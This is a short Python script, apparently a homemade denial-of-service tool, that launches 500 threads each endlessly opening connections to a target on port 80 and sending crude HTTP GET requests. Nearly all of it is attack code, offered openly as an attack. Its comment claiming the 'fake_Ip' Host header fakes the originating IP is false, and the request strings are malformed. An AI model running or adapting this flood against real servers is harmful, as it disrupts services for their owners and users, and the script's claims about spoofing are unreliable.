#importing the threading module for sumultanious process or threading
import threading
#importing the socket module for connection 
import socket

#change the target your testing ip
target = "127.0.0.1"
#port to perform the attack
port = 80
# Faking the originating ip.
fake_Ip = "192.168.0.220"

#Function to perform the attack.
def attack():
	while True:
#creating socket object.
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#connecting to the target with the socket object.
		s.connect((target,port))
#creating http request body.
		s.sendto(("GET " + target + "HTTP/1.1\r\n").encode('ascii'), (target, port))
		s.sendto(("Host " + fake_Ip + "\r\n\r\n").encode('ascii'), (target, port))
		s.close()
#create thread for multi-tasking
for i in range(500):
	threads = threading.Thread(target=attack)
	threads.start()
